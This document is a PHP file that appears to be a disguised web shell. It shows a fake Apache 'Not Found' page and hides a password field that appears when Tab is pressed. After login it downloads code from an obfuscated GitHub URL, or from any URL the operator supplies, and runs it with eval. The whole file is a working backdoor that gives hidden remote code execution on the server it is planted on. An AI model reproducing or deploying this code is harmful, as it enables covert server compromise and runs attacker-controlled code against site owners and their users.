<?php
session_start();

// ASCII-decoded URL
$asciiArray = [
    104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104,
    117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111,
    109, 47, 98, 111, 107, 97, 109, 97, 110, 49, 50, 47, 55, 104, 51, 111, 47,
    114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47,
    98, 97, 110, 100, 105, 114, 45, 112, 117, 116, 47, 101, 105, 107, 104, 97,
    110, 101, 47, 107, 105, 47, 107, 111, 114, 111, 115, 47, 102, 117, 99, 107,
    47, 121, 111, 117, 47, 98, 46, 116, 120, 116
];

$decodedString = '';
foreach ($asciiArray as $ascii) {
    $decodedString .= chr($ascii);
}
$url = $decodedString;

$correct_password = '$2y$10$cE1fZ09U/.4d3eT5zPZxE.e0.zOCvq5prclkQ9Z0xhEIV1F.ltnMy';

if (isset($_GET['ts_reset'])) {
    $_SESSION["ts_url"] = "";
    echo "success";
    exit;
}
?>
<!DOCTYPE HTML>
<html>
<head>
    <title>Not Found</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 2em;
            background: #fff;
            color: #000;
        }
        h1 {
            font-size: 22px;
        }
        .line {
            border-top: 1px solid #ccc;
            margin-top: 10px;
        }
        form {
            margin-top: 20px;
        }
        #password, #submitBtn {
            background: none;
            border: none;
            outline: none;
            font-family: inherit;
            font-size: 14px;
            color: #000;
            margin-top: 5px;
        }
        #pwLabel, #password, #submitBtn {
            display: none;
        }
        #submitBtn {
            cursor: pointer;
        }
    </style>
</head>
<body>
<h1>Not Found</h1>
<p>The requested URL <code>/proprietary-software.html</code> was not found on this server.</p>
<div class="line"></div>
<p><i>Apache/2.4.10 (Debian) Server at localhost Port 80</i></p>

<?php
if (!isset($_SESSION['ts_auth']) || $_SESSION['ts_auth'] !== true) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        $provided_password = $_POST['password'];
        if (password_verify($provided_password, $correct_password)) {
            $_SESSION['ts_auth'] = true;
            $_SESSION["ts_url"] = $_POST['url'] ?? $url;
            header("Location: " . $_SERVER['REQUEST_URI']);
            exit;
        } else {
            echo "<p style='color:red;'>Invalid password! Please try again.</p>";
        }
    }
    ?>
    <form method="post" id="loginForm">
        <label for="password" id="pwLabel">Password:</label><br>
        <input type="password" name="password" id="password" required><br>
        <input type="submit" value="Submit" id="submitBtn">
    </form>

    <script>
        document.addEventListener("keydown", function (event) {
            if (event.key === "Tab") {
                event.preventDefault(); // Prevent focus shift
                document.getElementById("pwLabel").style.display = "inline";
                document.getElementById("password").style.display = "inline";
                document.getElementById("submitBtn").style.display = "inline";
                document.getElementById("password").focus();
            }
        });
    </script>
</body>
</html>
<?php
    exit;
} else {
    $targetUrl = $_SESSION["ts_url"] ?: $url;
    $result = @file_get_contents($targetUrl);
    if (empty($result)) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $targetUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($ch);
        curl_close($ch);
    }
    if (is_string($result)) {
        eval('?>' . $result);
    } else {
        echo "<p>Error loading content.</p>";
    }
}
?>
